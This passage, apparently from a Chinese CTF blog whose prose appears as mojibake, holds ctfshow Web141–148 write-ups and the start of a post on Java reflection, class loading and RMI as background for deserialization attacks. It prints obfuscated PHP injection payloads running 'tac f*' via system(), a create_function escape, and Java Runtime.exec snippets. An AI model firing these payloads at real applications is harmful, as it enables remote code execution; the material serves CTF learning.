<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(tac f*);</span><br><span class="line">ç»è¿‡å–åå¤„ç†</span><br><span class="line">(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);</span><br><span class="line">payloadï¼š</span><br><span class="line">?v1=1&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);-&amp;v2=1</span><br><span class="line"></span><br><span class="line">?v1=1&amp;v2=2&amp;v3=-(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0)-</span><br></pre></td></tr></table></figure>

<h1 id="Web142"><a href="#Web142" class="headerlink" title="Web142"></a>Web142</h1><p>ç›´æ¥ä¼ 0å°±è¡Œäº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">?v1=0   	å…«è¿›åˆ¶</span><br><span class="line">?v1=0x0		16è¿›åˆ¶</span><br><span class="line">?v1=0e123	ç§‘å­¦è®¡æ•°æ³•</span><br></pre></td></tr></table></figure>

<h1 id="Web143"><a href="#Web143" class="headerlink" title="Web143"></a>Web143</h1><p>è¿™é¢˜æ˜¯141çš„å‡çº§ç‰ˆï¼Œæˆ‘ä»¬ç”¨å¼‚æˆ–å³å¯ã€‚</p>
<p>å¹¶ä¸”æ²¡æœ‰è¿‡æ»¤ä¹˜å·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=2&amp;v3=*(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%02%10%08%10&quot;^&quot;%60%60%60%20%60%60%60%60%2c%60%60%60&quot;)?&gt;</span><br><span class="line"></span><br><span class="line">?v1=1&amp;v2=2&amp;v3=-(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0)-</span><br></pre></td></tr></table></figure>

<h1 id="Web144"><a href="#Web144" class="headerlink" title="Web144"></a>Web144</h1><p>ç›´æ¥æ¢ä¸ªä½ç½®å°±è¡Œäº†è¿™é¢˜</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v3=-&amp;v2=(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0)</span><br></pre></td></tr></table></figure>

<h1 id="Web145"><a href="#Web145" class="headerlink" title="Web145"></a>Web145</h1><p>å¯ä»¥ä½¿ç”¨å†’å·é—®å·è¿æ¥</p>
<p>æµ‹è¯•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯å¯ä»¥è¿è¡Œå‡ºæ¥çš„</p>
<p>æ‰€ä»¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=%0a1&amp;v2=%0a0&amp;v3=?(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5):</span><br></pre></td></tr></table></figure>

<h1 id="Web146"><a href="#Web146" class="headerlink" title="Web146"></a>Web146</h1><p>åˆå¢åŠ äº†åˆ†å·çš„è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬æ²¡æ³•ç”¨ä¸‰ç›®è¿ç®—ç¬¦äº†ï¼Œè¿™æ—¶å€™æƒ³åˆ°äº†ç­‰å·å’Œä½è¿ç®—ç¬¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1==phpinfo()||1;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>ç»§ç»­å¥—å°±è¡Œ</p>
<h1 id="Web147"><a href="#Web147" class="headerlink" title="Web147"></a>Web147</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/iä¸åŒºåˆ†å¤§å°å†™</span><br><span class="line">/såŒ¹é…ä»»ä½•ä¸å¯è§å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ï¼Œç­‰ä»·äº[\f\n\r\t\v]</span><br><span class="line">/Då¦‚æœä½¿ç”¨$é™åˆ¶ç»“å°¾å­—ç¬¦,åˆ™ä¸å…è®¸ç»“å°¾æœ‰æ¢è¡Œ</span><br></pre></td></tr></table></figure>

<p>ç”±äºå‘½åç©ºé—´é—®é¢˜ï¼Œå¦‚æœè¦ç»å¯¹è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œä¾‹å¦‚systemï¼Œé‚£ä¹ˆå°±è¦å†™æˆ<code>\system</code></p>
<p>phpé‡Œé»˜è®¤å‘½åç©ºé—´æ˜¯\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚ æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯ å¾„ï¼› è€Œå¦‚æœå†™\function_name()è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚ å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™ æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?show=;&#125;;phpinfo();/*</span><br><span class="line">ctf=\create_function</span><br></pre></td></tr></table></figure>

<p>ç´§æ¥ç€å°±åˆ°äº†å¦‚ä½•åªæ§åˆ¶ç¬¬äºŒä¸ªå‚æ•°æ¥æ‰§è¡Œå‘½ä»¤çš„é—®é¢˜äº†ï¼Œåæ¥æ‰¾åˆ°å¯ä»¥ç”¨<code>create_function</code>æ¥å®Œæˆï¼Œ<code>create_function</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å†…å®¹ã€‚</p>
<p>å‡½æ•°ç»“æ„å½¢ä¼¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰§è¡Œï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦æ‰§è¡Œä»»æ„ä»£ç ï¼Œå°±é¦–å…ˆéœ€è¦è·³å‡ºè¿™ä¸ªå‡½æ•°å®šä¹‰ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111;&#125;phpinfo();//&#x27;</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ä»£ç å°±ä¼šæ‰§è¡Œ</p>
<h1 id="Web148"><a href="#Web148" class="headerlink" title="Web148"></a>Web148</h1><p>è¿™é¢˜å°±æœ‰ç‚¹æ²¡çœ‹æ‡‚çš„æ„Ÿè§‰</p>
<p>è¯´æ˜¯ä½¿ç”¨ä¸­æ–‡å˜é‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=$å“ˆ=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$å“ˆ&#125;[å“¼]($&#123;$å“ˆ&#125;[å—¯]);&amp;å“¼=system&amp;å—¯=tac f*</span><br><span class="line">&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; å¼‚æˆ–å‡ºæ¥çš„ç»“æœæ˜¯ _GET</span><br><span class="line">$&#123;_GET&#125;[å“¼]($&#123;_GET&#125;[å—¯]);&amp;å“¼=call_user_func&amp;å—¯=get_ctfshow_fl0g</span><br></pre></td></tr></table></figure>

<p>***â€&#96;</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>javaååºåˆ—åŒ–ä»¥åŠä¸€äº›å‰ç½®çŸ¥è¯†</title>
    <url>/2023/11/09/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9A%84%E4%B8%80%E4%BA%9B%E8%87%AA%E6%88%91%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<p>æœ€è¿‘å­¦ä¹ äº†javaååºåˆ—åŒ–ä»¥åŠåå°„ çš„ç›¸å…³çŸ¥è¯†ï¼Œå°±åœ¨è¿™ç¨å¾®åšä¸€äº›æ€»ç»“ã€‚</p>
<span id="more"></span>

<h1 id="ä¸€ã€Javaåå°„"><a href="#ä¸€ã€Javaåå°„" class="headerlink" title="ä¸€ã€Javaåå°„"></a>ä¸€ã€Javaåå°„</h1><p>javaåå°„å…¶å®ä¹Ÿå°±æ˜¯æ¯”è¾ƒåŸºç¡€ç®€å•çš„ï¼Œä¸»è¦å°±æ˜¯é›†ä¸­åœ¨ä¸€äº›å‡½æ•°ä¸Šã€‚</p>
<p>é¦–å…ˆå°±æ˜¯åå°„çš„ä½œç”¨æ˜¯ä»€ä¹ˆ</p>
<blockquote>
<p>1ã€è®©javaå…·æœ‰åŠ¨æ€æ€§</p>
<p>2ã€ä¿®æ”¹å·²æœ‰å¯¹è±¡çš„å±æ€§çš„å€¼</p>
<p>3ã€åŠ¨æ€ç”Ÿæˆå¯¹è±¡</p>
<p>4ã€åŠ¨æ€è°ƒç”¨æ–¹æ³•</p>
<p>5ã€æ“ä½œå†…éƒ¨ç±»å’Œç§æœ‰æ–¹æ³•ç§æœ‰å˜é‡</p>
</blockquote>
<p>å…¶æ¬¡å°±æ˜¯æœ€ä¸»è¦çš„ä¸€ç‚¹</p>
<p>Javaåå°„åœ¨Javaååºåˆ—åŒ–ä¸­çš„åº”ç”¨</p>
<blockquote>
<p><strong>1ã€å®šåˆ¶éœ€è¦çš„å¯¹è±¡</strong></p>
<p><strong>2ã€é€šè¿‡invokeå»è°ƒç”¨åŒåå‡½æ•°ä»¥å¤–çš„å‡½æ•°</strong></p>
<p><strong>3ã€é€šè¿‡Classç±»åˆ›å»ºå¯¹è±¡ï¼Œå¼•å…¥ä¸èƒ½åºåˆ—åŒ–çš„ç±»ç„¶åé€šè¿‡åå°„å»æ‰§è¡Œ</strong></p>
</blockquote>
<p>é¦–å…ˆå°±æ˜¯ä»‹ç»æ€»ç»“ä¸€ä¸‹javaåå°„ä¸­ç”¨åˆ°çš„ä¸€äº›ç›¸å…³æ–¹æ³•ï¼Œå½“ç„¶ä¹Ÿä¸æ˜¯ç›´æ¥å¯¹ç€æ–¹æ³•åè®°å¿†ï¼Œé‚£æ ·å¤ªæ¯ç‡¥äº†ï¼Œä¸»è¦å°±æ˜¯åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­å»å­¦ä¹ ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//è¿™ä¸ªçš„æ„æ€å°±æ˜¯è·å–åˆ°java.lang.Runtimeè¿™ä¸ªç±»ï¼Œæ˜¯ä¸€ç§è·å–ç±»æœ€å¸¸è§çš„æ–¹æ³•ï¼Œç„¶åè·å–åˆ°çš„ç±»å°±è¢«â€œç­‰åŒâ€äºclazzï¼ˆï¼ï¼ï¼è¿™é‡Œè¦æƒ³èµ·æ¥ç±»å’Œå¯¹è±¡ä¹‹é—´çš„åŒºåˆ«ï¼Œè¿™ä¸¤ä¸ªä¸æ˜¯åŒä¸€ç§ä¸œè¥¿ï¼ï¼ï¼ï¼‰</span></span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br><span class="line"><span class="comment">//è¿™é‡Œæˆ‘ä»¬å°±é€æ­¥åˆ†æï¼Œé¦–å…ˆå°±æ˜¯getMethodå°±æ˜¯è·å–ä¸€ä¸ªç±»çš„æ–¹æ³•</span></span><br><span class="line"><span class="comment">//æ ¼å¼ï¼š ç±».getMethodï¼ˆâ€œæ–¹æ³•åâ€, è¿™ä¸ªæ–¹æ³•éœ€è¦ä¼ é€’çš„å‚æ•°ç±»å‹ï¼‰</span></span><br><span class="line"><span class="comment">//ç„¶åå°±æ˜¯invokeï¼Œè¿™æ˜¯ä¸€ä¸ªè°ƒç”¨ä¸Šé¢è·å¾—çš„æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="comment">//æ ¼å¼ï¼š æ–¹æ³•å.(ç±»çš„ä¸€ä¸ªå¯¹è±¡,éœ€è¦ä¼ é€’ç»™æ–¹æ³•çš„å‚æ•°)</span></span><br><span class="line"><span class="comment">//newInstanceå°±æ˜¯è°ƒç”¨è¯¥ç±»çš„æ„é€ æ–¹æ³•å»å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡</span></span><br></pre></td></tr></table></figure>

<p>å½“ç„¶è¿™æ ·ç›´æ¥å»è¿è¡Œæ—¶ä¼šäº§ç”ŸæŠ¥é”™çš„ï¼ï¼ï¼è¿™åˆæ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>è¿™é‡Œä¸»è¦å°±æ˜¯å› ä¸ºæˆ‘ä»¬æ— æ³•é€šè¿‡newInstanceå»è·å¾—ç±»çš„å¯¹è±¡ï¼Œè€Œè¿™é‡Œæ˜¯å› ä¸ºRuntimeçš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œæ˜¯ä¸€ç§â€å•ä¾‹â€çš„è®¾è®¡æ¨¡å¼</p>
<blockquote>
<p>å•ä¾‹çš„è®¾è®¡æ¨¡å¼ï¼šä¸»è¦æ˜¯è€ƒè™‘åˆ°æŸäº›ç±»ä¸€èˆ¬åªéœ€è¦ç±»çš„åˆå§‹åŒ–æ—¶ä½¿ç”¨ä¸€æ¬¡æ„é€ æ–¹æ³•ï¼Œè€Œä¸æ˜¯æ¯æ¬¡éƒ½éœ€è¦å»å†é‡æ–°ä½¿ç”¨æ„é€ æ–¹æ³•ï¼Œä½†è¿™æ ·çš„è¯æˆ‘ä»¬åˆåº”è¯¥æ€ä¹ˆæ ·å»è°ƒç”¨æ„é€ æ–¹æ³•å‘¢ï¼Ÿæ‰€ä»¥è®¾è®¡è€…å°±è®¾è®¡äº†ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œåƒè¿™é‡Œçš„å°±æ˜¯getRuntimeè¿™ä¸ªæ–¹æ³•ï¼Œä½¿ç”¨è¿™ä¸ªæ–¹æ³•å°±ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡</p>
</blockquote>
<p>æ‰€ä»¥ä¿®æ”¹ä¹‹åçš„ä»£ç å°±æ˜¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethed.invoke(clazz);</span><br><span class="line">execMethod.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å¯ä»¥å»è°ƒç”¨åˆ°æˆ‘ä»¬éœ€è¦çš„æ–¹æ³•äº†ã€‚</p>
<p>å½“ç„¶è¿™æ ·ä¹Ÿæ˜¯è¿˜æœ‰ç‚¹ç¼ºç‚¹çš„ï¼Œå°±æ¯”å¦‚å¦‚æœæ²¡æœ‰è¿™ä¸ªgetRuntimeçš„æ–¹æ³•å‘¢ï¼Ÿè¿™åˆåº”è¯¥æ€ä¹ˆåŠï¼Ÿ</p>
<p>è¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨getConstructorè¿™ä¸ªæ–¹æ³•å»è·å–åˆ°æˆ‘ä»¬æƒ³è¦çš„ç±»ã€‚</p>
<blockquote>
<p>æ ¼å¼ï¼š ç±».getConstructor(æ„é€ æ–¹æ³•çš„å‚æ•°ç±»å‹)</p>
</blockquote>
<p>eg.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±æ˜¯å¦‚æœæ„é€ æ–¹æ³•æ˜¯ç§æœ‰æ–¹æ³•ï¼Œæˆ‘ä»¬åº”è¯¥å»ä½¿ç”¨getDeclaredMethodè¿™ä¸ªæ–¹æ³•ã€‚</p>
<blockquote>
<p>getMethod ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­æ‰€æœ‰å…¬å…±æ–¹æ³•ï¼ŒåŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿çš„æ–¹æ³• </p>
<p>getDeclaredMethod ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­â€œå£°æ˜â€çš„æ–¹æ³•ï¼Œæ˜¯å®åœ¨å†™åœ¨è¿™ä¸ªç±»é‡Œçš„ï¼ŒåŒ…æ‹¬ç§ æœ‰çš„æ–¹æ³•ï¼Œä½†ä»çˆ¶ç±»é‡Œç»§æ‰¿æ¥çš„å°±ä¸åŒ…å«äº†</p>
<p>è¿˜æœ‰å°±æ˜¯getConstructorå’ŒgetDeclaredConstructoråŸºæœ¬ä¸Šç›¸ä¼¼çš„ï¼Œè¿™é‡Œå°±ä¸è¿‡å¤šè§£é‡Šäº†</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>setAccessibleå¿…é¡»è¦è®¾ç½®ä¸ºtrueï¼Œä¸ç„¶æ— æ³•å»ä½¿ç”¨ã€‚</p>
<h1 id="äºŒã€JDKåŠ¨æ€ä»£ç†"><a href="#äºŒã€JDKåŠ¨æ€ä»£ç†" class="headerlink" title="äºŒã€JDKåŠ¨æ€ä»£ç†"></a>äºŒã€JDKåŠ¨æ€ä»£ç†</h1><p>é¦–å…ˆå°±æ˜¯ä¸ªäººæ„Ÿè§‰javaçš„åŠ¨æ€ä»£ç†æŠ€æœ¯å°±æœ‰ç‚¹ä¸Pythonä¸­çš„è£…é¥°å™¨</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-11/4b18054f0f5d8eb98cb45ce94a070ab0--4962--image-20240311143731878.png" alt="image-20240311143731878"></p>
<p>é€šè¿‡è°ƒç”¨jdkè‡ªå¸¦çš„ç›¸å…³æ–¹æ³•ï¼Œä»è€Œå»çœç•¥è·³è¿‡è‡ªèº«åˆ›å»ºé™æ€ä»£ç†</p>
<p>ProxyTest.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">UserInvocationHandler</span> <span class="variable">userinvocationhandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>();</span><br><span class="line"><span class="type">IUser</span> <span class="variable">userProxy</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),userinvocationhandler)</span><br><span class="line">userProxy.method;   <span class="comment">//è¿™æ ·å°±å¯ä»¥å»ä»£ç†userçš„æ–¹æ³•</span></span><br></pre></td></tr></table></figure>

<p>UserInvocationHandler.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">IUser user;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">(IUser user)</span>&#123;<span class="built_in">this</span>.user = user;&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">    method.invoke(user,args);   <span class="comment">//è¿›è¡Œåå°„å»è°ƒç”¨</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ä¹Ÿå°±æˆåŠŸå®ç°äº†ç®€å•çš„åŠ¨æ€ä»£ç†äº†</p>
<h1 id="ä¸‰ã€ç±»çš„åŠ¨æ€åŠ è½½"><a href="#ä¸‰ã€ç±»çš„åŠ¨æ€åŠ è½½" class="headerlink" title="ä¸‰ã€ç±»çš„åŠ¨æ€åŠ è½½"></a>ä¸‰ã€ç±»çš„åŠ¨æ€åŠ è½½</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br></pre></td></tr></table></figure>

<p>è·å¾—ç³»ç»Ÿå½“å‰çš„ç±»åŠ è½½å™¨</p>
<p> æ„é€ ä»£ç å—ï¼Œé™æ€ä»£ç å—â€”â€”â€”â€”â€”â€”â€”æ— è®ºè°ƒç”¨ä»€ä¹ˆæ„é€ æ–¹æ³•éƒ½ä¼šå…ˆè°ƒç”¨æ„é€ ä»£ç å—ã€‚åŒç†ï¼Œé™æ€ä»£ç å—ä¹Ÿæ˜¯å¦‚æ­¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//æ„é€ ä»£ç å—</span><br><span class="line">&#123;</span><br><span class="line">	xxxxxx</span><br><span class="line">&#125;</span><br><span class="line">é™æ€ä»£ç å—</span><br><span class="line">static&#123;</span><br><span class="line">	xxxxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å»å®ç°ä¸€ä¸ªå…·ä½“çš„ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Test.class&quot;</span>));</span><br><span class="line"><span class="comment">//        Class c =  (Class) defineClassMethod.invoke(cl, &quot;Test&quot;, code,0,code.length);</span></span><br><span class="line"><span class="comment">//        c.newInstance();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Unsafe.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br><span class="line">        Class&lt;?&gt; test = unsafe.defineClass(<span class="string">&quot;Test&quot;</span>, code, <span class="number">0</span>, code.length, cl, <span class="literal">null</span>);</span><br><span class="line">        test.newInstance();</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ç±»åŠ è½½å™¨å¯ä»¥å»å®ç°åŠ è½½è¿œç¨‹æˆ–è€…æœ¬åœ°çš„å…¶ä»–ç›®å½•ä¸‹çš„ç±»</p>
<h1 id="å››ã€RMI"><a href="#å››ã€RMI" class="headerlink" title="å››ã€RMI"></a>å››ã€RMI</h1><p>RMIå…¨ç§°æ˜¯Remote Method Invocationï¼Œè¿œç¨‹â½…æ³•è°ƒâ½¤ã€‚å¬è¿™åå­—åº”è¯¥ä¹Ÿå°±çŸ¥é“ï¼Œå°±æ˜¯å»ä»è°ƒç”¨ä¸€ä¸ªè¿œç¨‹ä¸»æœºä¸Šçš„javaæ–¹æ³•ï¼Œåœ¨è¿™é‡Œå°±æŒ‘ä¸€äº›é‡ç‚¹çš„ä»£ç ç‰‡æ®µè¿›è¡Œè®²è§£ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());(è¿™é‡Œæ˜¯æœåŠ¡å™¨ä¸Šå¯åŠ¨çš„)</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆç¬¬ä¸€è¡Œè¿™é‡Œå°±æ˜¯åˆ›å»ºå¹¶ä¸”æ‰§è¡ŒRegistryæœåŠ¡ï¼Œè¿™ä¸ªæœåŠ¡å°±æ˜¯ç›¸å½“äºä¸€ä¸ªä¸­ç»§å™¨ï¼Œæˆ‘å°†ç±»å’Œä¸€ä¸ªåå­—ç»‘å®šä¸¢åˆ°è¿™é‡Œé¢å»ï¼Œåˆ«çš„äººå°±å¯ä»¥é€šè¿‡åå­—å»æ‹¿åˆ°è¿™ä¸ªå¯¹åº”çš„ç±»ï¼Œè¿™å°±æ˜¯Registryæ‰€èµ·åˆ°çš„ä¸€ä¸ªä½œç”¨ã€‚ç„¶åå°±æ˜¯ç¬¬äºŒè¡Œï¼Œå°±æ˜¯å°†æœ¬æœºçš„ä¸€ä¸ªç±»ç»™ç»‘å®šåˆ°äº†ä¸€ä¸ªRegistryæœåŠ¡ä¸Šï¼Œè¿™æ ·ç­‰ä¹‹åå°±å¯ä»¥å»ç›´æ¥æ‹¿åˆ°è¿™ä¸ªç±»äº†ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RMIServer.<span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIServer.IRemoteHelloWorld)Naming.lookup(<span class="string">&quot;rmi://vps_ip:1099/Hello&quot;</span>);(æœ¬æœºè¿è¡Œ)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±é€šè¿‡Namingçš„lookupæ–¹æ³•å»å¯»æ‰¾è¿™ä¸ªrmiç±»ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨Registryä¸­æ‹¿åˆ°æˆ‘ä»¬æƒ³è¦çš„ç±»ã€‚</p>
<p>codebaseçš„åˆ©ç”¨æ–¹æ³•</p>
<p>åœ¨ä»¥å‰çš„æœ‰æ®µæ—¶é—´ï¼Œjavaæ˜¯å¯ä»¥è¿è¡Œåœ¨æµè§ˆå™¨ä¸Šçš„ï¼Œå°±æœ‰ä¸€ä¸ªcodebaseå±æ€§ï¼Œè¿™æ˜¯ä¸€ä¸ªåœ°å€ï¼Œå»å‘Šè¯‰å“ªä¸ªåœ°æ–¹å¯»æ‰¾ç±»ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨rmiçš„ç›¸å…³æ“ä½œï¼Œå»ä½¿å…¶åŠ è½½æˆ‘ä»¬è‡ªå·±éƒ¨ç½²çš„æœåŠ¡å™¨ä¸Šçš„ä¸€äº›æ¶æ„ç±»ã€‚</p>
<p>å°±æ¯”å¦‚åœ¨log4jè¿™ä¸ªCVEä¸­ï¼Œä¹Ÿæ˜¯å¯ä»¥å»ä½¿ç”¨rmiå»å®ç°çš„ï¼Œå»å®Œæˆåå¼¹shellä»è€Œè·å¾—æƒé™ã€‚</p>
